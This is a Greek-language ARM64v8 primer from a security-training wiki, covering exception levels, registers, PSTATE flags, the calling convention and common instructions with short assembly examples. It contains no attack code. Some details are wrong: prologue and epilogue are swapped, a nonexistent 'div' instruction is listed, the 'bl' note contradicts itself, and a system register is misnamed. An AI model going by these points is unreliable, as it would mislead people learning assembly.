# Εισαγωγή στο ARM64v8

{{#include ../../../banners/hacktricks-training.md}}

## **Επίπεδα Εξαίρεσης - EL (ARM64v8)**

Στην αρχιτεκτονική ARMv8, τα επίπεδα εκτέλεσης, γνωστά ως Exception Levels (ELs), καθορίζουν το επίπεδο προνομίων και τις δυνατότητες του περιβάλλοντος εκτέλεσης. Υπάρχουν τέσσερα επίπεδα εξαίρεσης, από EL0 έως EL3, το καθένα εξυπηρετεί διαφορετικό σκοπό:

1. **EL0 - User Mode**:
- Πρόκειται για το λιγότερο προνομιούχο επίπεδο και χρησιμοποιείται για την εκτέλεση κανονικού κώδικα εφαρμογών.
- Οι εφαρμογές που τρέχουν σε EL0 είναι απομονωμένες μεταξύ τους και από το σύστημα λογισμικού, ενισχύοντας την ασφάλεια και τη σταθερότητα.
2. **EL1 - Operating System Kernel Mode**:
- Τα περισσότερα λειτουργικά συστήματα εκτελούν τον kernel τους σε αυτό το επίπεδο.
- Το EL1 έχει περισσότερα προνόμια από το EL0 και μπορεί να προσπελάσει πόρους συστήματος, αλλά με κάποιους περιορισμούς για να διατηρεί την ακεραιότητα του συστήματος.
3. **EL2 - Hypervisor Mode**:
- Αυτό το επίπεδο χρησιμοποιείται για virtualization. Ένας hypervisor που τρέχει σε EL2 μπορεί να διαχειρίζεται πολλαπλά λειτουργικά συστήματα (το καθένα στο δικό του EL1) που τρέχουν στο ίδιο φυσικό υλικό.
- Το EL2 παρέχει δυνατότητες απομόνωσης και ελέγχου των εικονικοποιημένων περιβαλλόντων.
4. **EL3 - Secure Monitor Mode**:
- Αυτό είναι το πιο προνομιούχο επίπεδο και χρησιμοποιείται συχνά για secure booting και trusted execution περιβάλλοντα.
- Το EL3 μπορεί να διαχειρίζεται και να ελέγχει προσβάσεις μεταξύ secure και non-secure καταστάσεων (όπως secure boot, trusted OS, κ.λπ.).

Η χρήση αυτών των επιπέδων επιτρέπει μια δομημένη και ασφαλή διαχείριση διαφορετικών όψεων του συστήματος, από εφαρμογές χρήστη έως το πιο προνομιούχο λογισμικό συστήματος. Η προσέγγιση της ARMv8 στα επίπεδα προνομίων βοηθά στην αποτελεσματική απομόνωση των διαφόρων συστατικών του συστήματος, ενισχύοντας έτσι την ασφάλεια και την ανθεκτικότητα του συστήματος.

## **Καταχωρητές (ARM64v8)**

Το ARM64 έχει **31 καταχωρητές γενικής χρήσης**, επισημασμένους `x0` έως `x30`. Ο καθένας μπορεί να αποθηκεύσει μια **64-bit** (8-byte) τιμή. Για λειτουργίες που απαιτούν μόνο 32-bit τιμές, οι ίδιοι καταχωρητές μπορούν να προσπελαστούν σε 32-bit μορφή χρησιμοποιώντας τα ονόματα `w0` έως `w30`.

1. **`x0`** έως **`x7`** - Συνήθως χρησιμοποιούνται ως προσωρινοί καταχωρητές και για τη μεταβίβαση παραμέτρων σε υπορουτίνες.
- **`x0`** επίσης μεταφέρει τα δεδομένα επιστροφής μιας συνάρτησης.
2. **`x8`** - Στον Linux kernel, το `x8` χρησιμοποιείται ως ο αριθμός system call για την εντολή `svc`. **Στο macOS το x16 είναι αυτό που χρησιμοποιείται!**
3. **`x9`** έως **`x15`** - Περισσότεροι προσωρινοί καταχωρητές, συχνά χρησιμοποιούνται για τοπικές μεταβλητές.
4. **`x16`** και **`x17`** - **Intra-procedural Call Registers**. Προσωρινοί καταχωρητές για άμεσα (immediate) τιμές. Χρησιμοποιούνται επίσης για indirect function calls και PLT stubs.
- **`x16`** χρησιμοποιείται ως ο **system call number** για την εντολή **`svc`** στο **macOS**.
5. **`x18`** - **Platform register**. Μπορεί να χρησιμοποιηθεί ως γενικός καταχωρητής, αλλά σε κάποιες πλατφόρμες αυτός ο καταχωρητής προορίζεται για πλατφόρμα-συγκεκριμένες χρήσεις: Pointer στο current thread environment block στα Windows, ή για να δείχνει στην τρέχουσα δομή task που εκτελείται στον linux kernel.
6. **`x19`** έως **`x28`** - Αυτοί είναι callee-saved καταχωρητές. Μια συνάρτηση πρέπει να διατηρήσει τις τιμές αυτών των καταχωρητών για τον καλούντα, οπότε αποθηκεύονται στη στοίβα και ανακτώνται πριν επιστρέψει στον καλούντα.
7. **`x29`** - **Frame pointer** για την παρακολούθηση του stack frame. Όταν δημιουργείται ένα νέο stack frame λόγω μιας κλήσης συνάρτησης, ο καταχωρητής **`x29`** **αποθηκεύεται στη στοίβα** και η **νέα** διεύθυνση δείκτη πλαισίου (η διεύθυνση του `sp`) **αποθηκεύεται σε αυτόν τον καταχωρητή**.
- Αυτός ο καταχωρητής μπορεί επίσης να χρησιμοποιηθεί ως **γενικός καταχωρητής**, αν και συνήθως χρησιμοποιείται ως αναφορά για **τοπικές μεταβλητές**.
8. **`x30`** ή **`lr`** - **Link register**. Κρατά τη **διεύθυνση επιστροφής** όταν εκτελείται μια εντολή `BL` (Branch with Link) ή `BLR` (Branch with Link to Register) αποθηκεύοντας την τιμή του **`pc`** σε αυτόν τον καταχωρητή.
- Μπορεί επίσης να χρησιμοποιηθεί σαν κάθε άλλος καταχωρητής.
- Αν η τρέχουσα συνάρτηση πρόκειται να καλέσει μια νέα συνάρτηση και επομένως να υπερεγράψει το `lr`, θα το αποθηκεύσει στη στοίβα στην αρχή — αυτό είναι το epilogue (`stp x29, x30 , [sp, #-48]; mov x29, sp` -> Αποθήκευση `fp` και `lr`, δημιουργία χώρου και λήψη νέου `fp`) και το ανακτά στο τέλος — αυτό είναι το prologue (`ldp x29, x30, [sp], #48; ret` -> Ανάκτηση `fp` και `lr` και επιστροφή).
9. **`sp`** - **Stack pointer**, χρησιμοποιείται για την παρακολούθηση της κορυφής της στοίβας.
- Η τιμή του **`sp`** πρέπει πάντα να διατηρείται με τουλάχιστον **ευθυγράμμιση quadword** αλλιώς μπορεί να συμβεί alignment exception.
10. **`pc`** - **Program counter**, που δείχνει στην επόμενη εντολή. Αυτός ο καταχωρητής μπορεί να ενημερώνεται μόνο μέσω παραγωγής εξαιρέσεων (exception), επιστροφών εξαιρέσεων, και branch εντολών. Οι μόνοι κανονικοί εντολές που μπορούν να διαβάσουν αυτόν τον καταχωρητή είναι οι εντολές branch with link (BL, BLR) που αποθηκεύουν τη διεύθυνση του **`pc`** στο **`lr`** (Link Register).
11. **`xzr`** - **Zero register**. Επίσης ονομάζεται **`wzr`** στη 32-bit μορφή του. Μπορεί να χρησιμοποιηθεί για να πάρει εύκολα την τιμή μηδέν (συνηθισμένη λειτουργία) ή για να πραγματοποιήσει συγκρίσεις χρησιμοποιώντας **`subs`** όπως **`subs XZR, Xn, #10`** αποθηκεύοντας το αποτέλεσμα πουθενά (στο **`xzr`**).

Οι καταχωρητές **`Wn`** είναι η **32bit** έκδοση των **`Xn`** καταχωρητών.

> [!TIP]
> Οι καταχωρητές από X0 έως X18 είναι volatile, που σημαίνει ότι οι τιμές τους μπορούν να αλλάξουν από κλήσεις συναρτήσεων και interruptions. Ωστόσο, οι καταχωρητές από X19 έως X28 είναι non-volatile, που σημαίνει ότι οι τιμές τους πρέπει να διατηρούνται μεταξύ κλήσεων συναρτήσεων ("callee saved").

### SIMD και Καταχωρητές κινητής υποδιαστολής

Επιπλέον, υπάρχουν άλλοι **32 καταχωρητές μήκους 128bit** που μπορούν να χρησιμοποιηθούν σε βελτιστοποιημένες λειτουργίες single instruction multiple data (SIMD) και για την εκτέλεση αριθμητικών πράξεων κινητής υποδιαστολής. Αυτοί καλούνται Vn registers αν και μπορούν επίσης να λειτουργήσουν σε **64**-bit, **32**-bit, **16**-bit και **8**-bit και τότε ονομάζονται **`Qn`**, **`Dn`**, **`Sn`**, **`Hn`** και **`Bn`**.

### Καταχωρητές Συστήματος

**Υπάρχουν εκατοντάδες συστημικοί καταχωρητές**, επίσης ονομαζόμενοι special-purpose registers (SPRs), που χρησιμοποιούνται για **παρακολούθηση** και **έλεγχο** της συμπεριφοράς των **επεξεργαστών**.\
Μπορούν να διαβαστούν ή να ρυθμιστούν μόνο χρησιμοποιώντας τις ειδικές εντολές **`mrs`** και **`msr`**.

Οι ειδικοί καταχωρητές **`TPIDR_EL0`** και **`TPIDDR_EL0`** εμφανίζονται συχνά κατά την reverse engineering. Το επίθημα `EL0` υποδεικνύει το **ελάχιστο επίπεδο εξαίρεσης** από το οποίο μπορεί να προσπελαστεί ο καταχωρητής (σε αυτή την περίπτωση το EL0 είναι το κανονικό επίπεδο προνομίων στο οποίο τρέχουν τα κανονικά προγράμματα).\
Χρησιμοποιούνται συχνά για να αποθηκεύσουν τη **βασική διεύθυνση της περιοχής thread-local storage** στη μνήμη. Συνήθως ο πρώτος είναι αναγνώσιμος και εγγράψιμος από προγράμματα που τρέχουν σε EL0, αλλά ο δεύτερος μπορεί να διαβαστεί από EL0 και να γραφτεί από EL1 (π.χ. από τον kernel).

- `mrs x0, TPIDR_EL0 ; Read TPIDR_EL0 into x0`
- `msr TPIDR_EL0, X0 ; Write x0 into TPIDR_EL0`

### **PSTATE**

Το **PSTATE** περιέχει διάφορα στοιχεία της διεργασίας σειροποιημένα στον ειδικό καταχωρητή που είναι ορατός από το λειτουργικό σύστημα **`SPSR_ELx`**, όπου το X είναι το **επίπεδο προνομίων της ενεργοποιηθείσας** εξαίρεσης (αυτό επιτρέπει την ανάκτηση της κατάστασης της διεργασίας όταν τελειώσει η εξαίρεση).\
Αυτά είναι τα πεδία που είναι προσβάσιμα:

<figure><img src="../../../images/image (1196).png" alt=""><figcaption></figcaption></figure>

- Οι σημαίες συνθηκών **`N`**, **`Z`**, **`C`** και **`V`**:
- **`N`** σημαίνει ότι η λειτουργία απέδωσε αρνητικό αποτέλεσμα
- **`Z`** σημαίνει ότι η λειτουργία απέδωσε μηδέν
- **`C`** σημαίνει ότι υπήρξε μεταφορά (carry)
- **`V`** σημαίνει ότι η λειτουργία απέδωσε υπορροή για υπογεγραμμένους αριθμούς (signed overflow):
  - Το άθροισμα δύο θετικών αριθμών αποδίδει αρνητικό αποτέλεσμα.
  - Το άθροισμα δύο αρνητικών αριθμών αποδίδει θετικό αποτέλεσμα.
  - Σε αφαίρεση, όταν ένας μεγάλος αρνητικός αριθμός αφαιρείται από έναν μικρότερο θετικό αριθμό (ή το αντίθετο), και το αποτέλεσμα δεν μπορεί να αναπαρασταθεί εντός του εύρους του δοθέντος bit size.
- Προφανώς ο επεξεργαστής δεν "ξέρει" αν η λειτουργία είναι signed ή όχι, οπότε θα ελέγξει τα C και V στις λειτουργίες και θα δηλώσει αν συνέβη carry σε περίπτωση που ήταν signed ή unsigned.

> [!WARNING]
> Όλες οι εντολές δεν ενημερώνουν αυτές τις σημαίες. Κάποιες όπως **`CMP`** ή **`TST`** το κάνουν, και άλλες που έχουν το επίθεμα s όπως **`ADDS`** επίσης το κάνουν.

- Η τρέχουσα σημαία **register width (`nRW`)**: Αν η σημαία έχει την τιμή 0, το πρόγραμμα θα τρέξει σε κατάσταση εκτέλεσης AArch64 όταν επανεκκινήσει.
- Το τρέχον **Exception Level** (**`EL`**): Ένα κανονικό πρόγραμμα που τρέχει σε EL0 θα έχει την τιμή 0.
- Η σημαία **single stepping** (**`SS`**): Χρησιμοποιείται από debuggers για single step θέτοντας τη σημαία SS σε 1 μέσα στο **`SPSR_ELx`** μέσω μιας εξαίρεσης. Το πρόγραμμα θα εκτελέσει ένα βήμα και θα προκαλέσει single step εξαίρεση.
- Η σημαία **illegal exception state** (**`IL`**): Χρησιμοποιείται για να σηματοδοτήσει όταν λογισμικό με προνόμια εκτελεί μια μη έγκυρη μεταφορά επιπέδου εξαίρεσης, αυτή η σημαία τίθεται σε 1 και ο επεξεργαστής πυροδοτεί illegal state εξαίρεση.
- Οι σημαίες **`DAIF`**: Αυτές οι σημαίες επιτρέπουν σε προνομιούχο λογισμικό να αποκρύψει επιλεκτικά ορισμένες εξωτερικές εξαιρέσεις.
  - Αν το **`A`** είναι 1 σημαίνει ότι θα ενεργοποιηθούν **asynchronous aborts**. Το **`I`** ρυθμίζει την απόκριση σε εξωτερικά **Interrupt Requests** (IRQs). και το F σχετίζεται με **Fast Interrupt Requests** (FIRs).
- Οι σημαίες επιλογής δείκτη στοίβας (**`SPS`**): Προνομιούχα προγράμματα που τρέχουν σε EL1 και άνω μπορούν να εναλλάσσουν μεταξύ της χρήσης του δικού τους καταχωρητή δείκτη στοίβας και του user-model ενός (π.χ. μεταξύ `SP_EL1` και `EL0`). Αυτή η εναλλαγή πραγματοποιείται γράφοντας στον ειδικό καταχωρητή **`SPSel`**. Αυτό δεν μπορεί να γίνει από το EL0.

## **Calling Convention (ARM64v8)**

Το calling convention του ARM64 ορίζει ότι οι **πρώτες οκτώ παραμέτροι** μιας συνάρτησης περνάνε σε καταχωρητές **`x0` έως `x7`**. **Επιπλέον** παράμετροι περνάνε στη **στοίβα**. Η **τιμή επιστροφής** δίνεται πίσω στον καταχωρητή **`x0`**, ή και στο **`x1`** αν είναι **128 bits**. Οι καταχωρητές **`x19`** έως **`x30`** και **`sp`** πρέπει να **διατηρούνται** μεταξύ κλήσεων συναρτήσεων.

Όταν διαβάζετε μια συνάρτηση σε assembly, ψάξτε για το **prologue** και το **epilogue** της συνάρτησης. Το **prologue** συνήθως περιλαμβάνει **αποθήκευση του frame pointer (`x29`)**, **ρύθμιση** ενός **νέου frame pointer**, και **δέσμευση χώρου στη στοίβα**. Το **epilogue** συνήθως περιλαμβάνει **ανάκτηση του αποθηκευμένου frame pointer** και **επιστροφή** από τη συνάρτηση.

### Calling Convention στο Swift

Το Swift έχει το δικό του **calling convention** που μπορεί να βρεθεί στο [**https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64**](https://github.com/apple/swift/blob/main/docs/ABI/CallConvSummary.rst#arm64)

## **Συνήθεις Εντολές (ARM64v8)**

Οι εντολές ARM64 γενικά έχουν τη **μορφή `opcode dst, src1, src2`**, όπου το **`opcode`** είναι η **ενέργεια** που θα εκτελεστεί (όπως `add`, `sub`, `mov`, κ.λπ.), το **`dst`** είναι ο **καταχωρητής προορισμού** όπου θα αποθηκευτεί το αποτέλεσμα, και τα **`src1`** και **`src2`** είναι οι **καταχωρητές πηγής**. Μπορούν επίσης να χρησιμοποιηθούν άμεσες (immediate) τιμές στη θέση των καταχωρητών πηγής.

- **`mov`**: **Μετακινεί** μια τιμή από έναν **καταχωρητή** σε έναν άλλο.
- Παράδειγμα: `mov x0, x1` — Μεταφέρει την τιμή από το `x1` στο `x0`.
- **`ldr`**: **Φορτώνει** μια τιμή από τη **μνήμη** σε έναν **καταχωρητή**.
- Παράδειγμα: `ldr x0, [x1]` — Φορτώνει μια τιμή από τη διεύθυνση μνήμης που δείχνει το `x1` στο `x0`.
- **Offset mode**: Ένα offset που επηρεάζει την αρχική διεύθυνση υποδεικνύεται, για παράδειγμα:
- `ldr x2, [x1, #8]`, αυτό θα φορτώσει στο x2 την τιμή από x1 + 8
- `ldr x2, [x0, x1, lsl #2]`, αυτό θα φορτώσει στο x2 ένα αντικείμενο από τον πίνακα x0, από τη θέση x1 (index) * 4
- **Pre-indexed mode**: Αυτό θα εφαρμόσει τους υπολογισμούς στην αρχική διεύθυνση, θα πάρει το αποτέλεσμα και επίσης θα αποθηκεύσει τη νέα αρχική διεύθυνση στην αρχική.
- `ldr x2, [x1, #8]!`, αυτό θα φορτώσει `x1 + 8` στο `x2` και θα αποθηκεύσει στο x1 το αποτέλεσμα του `x1 + 8`
- `str lr, [sp, #-4]!`, Αποθηκεύει τον link register στο sp και ενημερώνει τον καταχωρητή sp
- **Post-index mode**: Αυτό είναι όπως το προηγούμενο αλλά η διεύθυνση μνήμης προσπελαύνεται και μετά υπολογίζεται και αποθηκεύεται το offset.
- `ldr x0, [x1], #8`, φορτώνει το `x1` στο `x0` και ενημερώνει το x1 με `x1 + 8`
- **PC-relative addressing**: Σε αυτή την περίπτωση η διεύθυνση που θα φορτωθεί υπολογίζεται σχετική με τον καταχωρητή PC
- `ldr x1, =_start`, Αυτό θα φορτώσει τη διεύθυνση όπου ξεκινά το σύμβολο `_start` στο x1 σε σχέση με το τρέχον PC.
- **`str`**: **Αποθηκεύει** μια τιμή από έναν **καταχωρητή** στη **μνήμη**.
- Παράδειγμα: `str x0, [x1]` — Αυτό αποθηκεύει την τιμή στο `x0` στη διεύθυνση μνήμης που δείχνει το `x1`.
- **`ldp`**: **Load Pair of Registers**. Αυτή η εντολή **φορτώνει δύο καταχωρητές** από **διαδοχικές θέσεις μνήμης**. Η διεύθυνση μνήμης σχηματίζεται συνήθως προσθέτοντας ένα offset στην τιμή ενός άλλου καταχωρητή.
- Παράδειγμα: `ldp x0, x1, [x2]` — Αυτό φορτώνει το `x0` και το `x1` από τις διευθύνσεις μνήμης `x2` και `x2 + 8`, αντίστοιχα.
- **`stp`**: **Store Pair of Registers**. Αυτή η εντολή **αποθηκεύει δύο καταχωρητές** σε **διαδοχικές θέσεις μνήμης**. Η διεύθυνση μνήμης σχηματίζεται συνήθως προσθέτοντας ένα offset στην τιμή ενός άλλου καταχωρητή.
- Παράδειγμα: `stp x0, x1, [sp]` — Αυτό αποθηκεύει το `x0` και το `x1` στις διευθύνσεις μνήμης `sp` και `sp + 8`, αντίστοιχα.
- `stp x0, x1, [sp, #16]!` — Αυτό αποθηκεύει το `x0` και το `x1` στις διευθύνσεις μνήμης `sp+16` και `sp + 24`, αντίστοιχα, και ενημερώνει το `sp` με `sp+16`.
- **`add`**: **Προσθέτει** τις τιμές δύο καταχωρητών και αποθηκεύει το αποτέλεσμα σε έναν καταχωρητή.
- Σύνταξη: add(s) Xn1, Xn2, Xn3 | #imm, \[shift #N | RRX]
- Xn1 -> Προορισμός
- Xn2 -> Όπεραντ 1
- Xn3 | #imm -> Όπεραντ 2 (καταχωρητής ή immediate)
- \[shift #N | RRX] -> Εκτέλεση shift ή χρήση RRX
- Παράδειγμα: `add x0, x1, x2` — Προσθέτει τις τιμές στα `x1` και `x2` και αποθηκεύει το αποτέλεσμα στο `x0`.
- `add x5, x5, #1, lsl #12` — Αυτό ισούται με 4096 (ένα 1 μετατοπισμένο 12 φορές) -> 1 0000 0000 0000 0000
- **`adds`**: Εκτελεί `add` και ενημερώνει τις σημαίες.
- **`sub`**: **Αφαιρεί** τις τιμές δύο καταχωρητών και αποθηκεύει το αποτέλεσμα σε έναν καταχωρητή.
- Δείτε τη σύνταξη του **`add`**.
- Παράδειγμα: `sub x0, x1, x2` — Αφαιρεί την τιμή στο `x2` από το `x1` και αποθηκεύει το αποτέλεσμα στο `x0`.
- **`subs`**: Όπως το `sub` αλλά ενημερώνει τις σημαίες.
- **`mul`**: **Πολλαπλασιάζει** τις τιμές **δύο καταχωρητών** και αποθηκεύει το αποτέλεσμα σε έναν καταχωρητή.
- Παράδειγμα: `mul x0, x1, x2` — Πολλαπλασιάζει τις τιμές στα `x1` και `x2` και αποθηκεύει το αποτέλεσμα στο `x0`.
- **`div`**: **Διαιρεί** την τιμή ενός καταχωρητή με την τιμή ενός άλλου και αποθηκεύει το αποτέλεσμα σε έναν καταχωρητή.
- Παράδειγμα: `div x0, x1, x2` — Διαιρεί την τιμή στο `x1` με το `x2` και αποθηκεύει το αποτέλεσμα στο `x0`.
- **`lsl`**, **`lsr`**, **`asr`**, **`ror`, `rrx`**:
  - **Logical shift left**: Προσθέτει 0s στο τέλος μετακινώντας τα υπόλοιπα bits προς τα εμπρός (πολλαπλασιασμός επί 2^n).
  - **Logical shift right**: Προσθέτει 0s στην αρχή μετακινώντας τα υπόλοιπα bits προς τα πίσω (διαίρεση επί 2^n για unsigned).
  - **Arithmetic shift right**: Όπως το **`lsr`**, αλλά αντί για 0s, αν το πιο σημαντικό bit είναι 1, προστίθενται 1s (διαίρεση επί 2^n για signed).
  - **Rotate right**: Όπως το **`lsr`** αλλά όσα bits αποβάλλονται από τα δεξιά προστίθενται στα αριστερά.
  - **Rotate Right with Extend**: Όπως το **`ror`**, αλλά με τη σημαία carry ως το "πιο σημαντικό bit". Έτσι, η σημαία carry μεταφέρεται στο bit 31 και το αποβληθέν bit πηγαίνει στη σημαία carry.
- **`bfm`**: **Bit Field Move**, αυτές οι εντολές **αντιγράφουν bits `0...n`** από μια τιμή και τα τοποθετούν στις θέσεις **`m..m+n`**. Το **`#s`** καθορίζει τη **αριστερότερη θέση bit** και το **`#r`** το **rotate right ποσό**.
- Bitfield move: `BFM Xd, Xn, #r`
- Signed Bitfield move: `SBFM Xd, Xn, #r, #s`
- Unsigned Bitfield move: `UBFM Xd, Xn, #r, #s`
- **Bitfield Extract and Insert:** Αντιγραφή ενός bitfield από έναν καταχωρητή και εισαγωγή του σε άλλον καταχωρητή.
- **`BFI X1, X2, #3, #4`** Εισάγει 4 bits από X2 στη θέση 3 του X1
- **`BFXIL X1, X2, #3, #4`** Εξάγει από το 3ο bit του X2 τέσσερα bits και τα αντιγράφει στο X1
- **`SBFIZ X1, X2, #3, #4`** Εκτείνει με υπογραφή 4 bits από X2 και τα εισάγει στο X1 ξεκινώντας στη θέση bit 3 μηδενίζοντας τα δεξιά bits
- **`SBFX X1, X2, #3, #4`** Εξάγει 4 bits ξεκινώντας από το bit 3 του X2, τα επεκτείνει με υπογραφή και τοποθετεί το αποτέλεσμα στο X1
- **`UBFIZ X1, X2, #3, #4`** Μηδενικά-επεκτείνει 4 bits από X2 και τα εισάγει στο X1 ξεκινώντας στη θέση bit 3 μηδενίζοντας τα δεξιά bits
- **`UBFX X1, X2, #3, #4`** Εξάγει 4 bits ξεκινώντας από το bit 3 του X2 και τοποθετεί το μηδενικά-επεκταμένο αποτέλεσμα στο X1.
- **Sign Extend To X:** Επεκτείνει το πρόσημο (ή απλά προσθέτει 0s στην unsigned έκδοση) μιας τιμής ώστε να μπορεί να χρησιμοποιηθεί σε πράξεις:
- **`SXTB X1, W2`** Επεκτείνει το πρόσημο ενός byte **από W2 σε X1** (`W2` είναι το χαμηλό μισό του `X2`) για να γεμίσει τα 64 bits
- **`SXTH X1, W2`** Επεκτείνει το πρόσημο ενός 16-bit αριθμού **από W2 σε X1** για να γεμίσει τα 64 bits
- **`SXTW X1, W2`** Επεκτείνει το πρόσημο ενός 32-bit αριθμού **από W2 σε X1** για να γεμίσει τα 64 bits
- **`UXTB X1, W2`** Προσθέτει 0s (unsigned) σε ένα byte **από W2 σε X1** για να γεμίσει τα 64 bits
- **`extr`**: Εξάγει bits από ένα συγκεκριμένο **ζεύγος καταχωρητών συνενωμένων**.
- Παράδειγμα: `EXTR W3, W2, W1, #3` Αυτό θα **συνενώσει W1+W2** και θα πάρει **από το bit 3 του W2 έως το bit 3 του W1** και θα το αποθηκεύσει στο W3.
- **`cmp`**: **Συγκρίνει** δύο καταχωρητές και θέτει τις σημαίες συνθηκών. Είναι ένα **alias του `subs`** που θέτει τον προορισμό στον zero register. Χρήσιμο για να ελέγξετε αν `m == n`.
- Υποστηρίζει την **ίδια σύνταξη με το `subs`**
- Παράδειγμα: `cmp x0, x1` — Αυτό συγκρίνει τις τιμές στο `x0` και το `x1` και θέτει ανάλογα τις σημαίες συνθηκών.
- **`cmn`**: **Compare negative** operand. Σε αυτή την περίπτωση είναι ένα **alias του `adds`** και υποστηρίζει την ίδια σύνταξη. Χρήσιμο για να ξέρετε αν `m == -n`.
- **`ccmp`**: Conditional comparison, είναι μια σύγκριση που θα εκτελεστεί μόνο αν μια προηγούμενη σύγκριση ήταν αληθής και θα ρυθμίσει συγκεκριμένα τα bits nzcv.
- `cmp x1, x2; ccmp x3, x4, 0, NE; blt _func` -> αν x1 != x2 και x3 < x4, πήγαινε στη func
- Αυτό γιατί το **`ccmp`** θα εκτελεστεί μόνο αν το **προηγούμενο `cmp` ήταν `NE`**, αν δεν ήταν τα bits `nzcv` θα τεθούν σε 0 (που δεν θα ικανοποιήσει τη σύγκριση `blt`).
- Αυτό μπορεί επίσης να χρησιμοποιηθεί ως `ccmn` (το ίδιο αλλά αρνητικό, όπως `cmp` vs `cmn`).
- **`tst`**: Ελέγχει αν οποιεσδήποτε από τις τιμές της σύγκρισης έχουν και οι δύο bit = 1 (λειτουργεί σαν ANDS χωρίς να αποθηκεύει το αποτέλεσμα). Είναι χρήσιμο για να ελέγξετε έναν καταχωρητή με μια τιμή και να δείτε αν οποιοδήποτε από τα bits που υποδεικνύει η τιμή είναι 1.
- Παράδειγμα: `tst X1, #7` Έλεγχος αν οποιοδήποτε από τα τελευταία 3 bits του X1 είναι 1
- **`teq`**: XOR λειτουργία απορρίπτοντας το αποτέλεσμα
- **`b`**: Απλή Branch (απροσάρμοστο άλμα)
- Παράδειγμα: `b myFunction`
- Σημειώστε ότι αυτό δεν γεμίζει το link register με τη διεύθυνση επιστροφής (δεν είναι κατάλληλο για κλήσεις υπορουτινών που πρέπει να επιστρέψουν).
- **`bl`**: **Branch** with link, χρησιμοποιείται για την **κλήση** μιας **υπορουτίνας**. Αποθηκεύει τη **διεύθυνση επιστροφής στο `x30`**.
- Παράδειγμα: `bl myFunction` — Αυτό καλεί τη συνάρτηση `myFunction` και αποθηκεύει τη διεύθυνση επιστροφής στο `x30`.
- Σημειώστε ότι αυτό δεν γεμίζει τον link register με τη διεύθυνση επιστροφής (όχι κατάλληλο για υπορουτίνες που χρειάζεται να επιστρέψουν πίσω)
- **`blr`**: **Branch** with Link to Register, χρησιμοποιείται για την **κλήση** μιας **υπορουτίνας** όπου ο στόχος καθορίζεται σε έναν **καταχωρητή**. Αποθηκεύει τη διεύθυνση επιστροφής στο `x30`. 
- Παράδειγμα: `blr x1` — Αυτό καλεί τη συνάρτηση της οποίας η διεύθυνση περιέχεται στο `x1` και αποθηκεύει τη διεύθυνση επιστροφής στο `x30`.
- **`ret`**: **Επιστροφή** από υπορουτίνα, τυπικά χρησιμοποιώντας τη διεύθυνση στο **`x30`**.
- Παράδειγμα: `ret` — Επιστρέφει από την τρέχουσα υπορουτίνα χρησιμοποιώντας τη διεύθυνση επιστροφής στο `x30`.
- **`b.<cond>`**: Υπό όρους branch εντολές
- **`b.eq`**: **Άλμα αν ίσο**, βασισμένο στην προηγούμενη εντολή `cmp`.
- Παράδειγμα: `b.eq label` — Αν η προηγούμενη εντολή `cmp` βρήκε δύο ίσες τιμές, τότε πηγαίνει στο `label`.
- **`b.ne`**: **Branch if Not Equal**. Αυτή η εντολή ελέγχει τις σημαίες συνθηκών (που ρυθμίστηκαν από μια προηγούμενη εντολή σύγκρισης), και αν οι τιμές δεν ήταν ίσες, κάνει branch σε μια ετικέτα ή διεύθυνση.
- Παράδειγμα: Μετά από `cmp x0, x1`, `b.ne label` — Αν οι τιμές στο `x0` και `x1` δεν ήταν ίσες, τότε πηγαίνει στο `label`.
- **`cbz`**: **Compare and Branch on Zero**. Αυτή η εντολή συγκρίνει έναν καταχωρητή με το μηδέν, και αν είναι ίσοι, κάνει branch σε μια ετικέτα ή διεύθυνση.
- Παράδειγμα: `cbz x0, label` — Αν η τιμή στο `x0` είναι μηδέν, πηγαίνει στο `label`.
- **`cbnz`**: **Compare and Branch on Non-Zero**. Αυτή η εντολή συγκρίνει έναν καταχωρητή με το μηδέν, και αν δεν είναι ίσοι, κάνει branch σε μια ετικέτα ή διεύθυνση.
- Παράδειγμα: `cbnz x0, label` — Αν η τιμή στο `x0` δεν είναι μηδέν, πηγαίνει στο `label`.
- **`tbnz`**: Test bit and branch on nonzero
- Παράδειγμα: `tbnz x0, #8, label`
- **`tbz`**: Test bit and branch on zero
- Παράδειγμα: `tbz x0, #8, label`
- **Επιλογές conditional select**: Αυτές είναι εντολές των οποίων η συμπεριφορά αλλάζει ανάλογα με τα conditional bits.
- `csel Xd, Xn, Xm, cond` -> `csel X0, X1, X2, EQ` -> Αν αληθές, X0 = X1, αν ψευδές, X0 = X2
- `csinc Xd, Xn, Xm, cond` -> Αν αληθές, Xd = Xn, αν ψευδές, Xd = Xm + 1
- `cinc Xd, Xn, cond` -> Αν αληθές, Xd = Xn + 1, αν ψευδές, Xd = Xn
- `csinv Xd, Xn, Xm, cond` -> Αν αληθές, Xd = Xn, αν ψευδές, Xd = NOT(Xm)
- `cinv Xd, Xn, cond` -> Αν αληθές, Xd = NOT(Xn), αν ψευδές, Xd = Xn
- `csneg Xd, Xn, Xm, cond` -> Αν αληθές, Xd = Xn, αν ψευδές, Xd = - Xm
- `cneg Xd, Xn, cond` -> Αν αληθές, Xd = - Xn, αν ψευδές, Xd = Xn
- `cset Xd, Xn, Xm, cond` -> Αν αληθές, Xd = 1, αν ψευδές, Xd = 0
- `csetm Xd, Xn, Xm, cond` -> Αν αληθές, Xd = \<all 1>, αν ψευδές, Xd = 0
- **`adrp`**: Υπολογίζει τη **διεύθυνση της σελίδας ενός συμβόλου** και την αποθηκεύει σε έναν καταχωρητή.
- Παράδειγμα: `adrp x0, symbol` — Υπολογίζει τη διεύθυνση σελίδας του `symbol` και την αποθηκεύει στο `x0`.
- **`ldrsw`**: **Φορτώνει** μια υπογεγραμμένη **32-bit** τιμή από τη μνήμη και **την επεκτείνει με υπογραφή σε 64** bits.
- Παράδειγμα: `ldrsw x0, [x1]` — Φορτώνει μια υπογεγραμμένη 32-bit τιμή από τη διεύθυνση που δείχνει το `x1`, την επεκτείνει σε 64 bits, και την αποθηκεύει στο `x0`.
- **`stur`**: **Αποθηκεύει την τιμή ενός καταχωρητή σε μια θέση μνήμης**, χρησιμοποιώντας ένα offset από έναν άλλο καταχωρητή.
- Παράδειγμα: `stur x0, [x1, #4]` — Αποθηκεύει την τιμή στο `x0` στη διεύθυνση που είναι 4 bytes μεγαλύτερη από αυτή που περιέχει το `x1`.
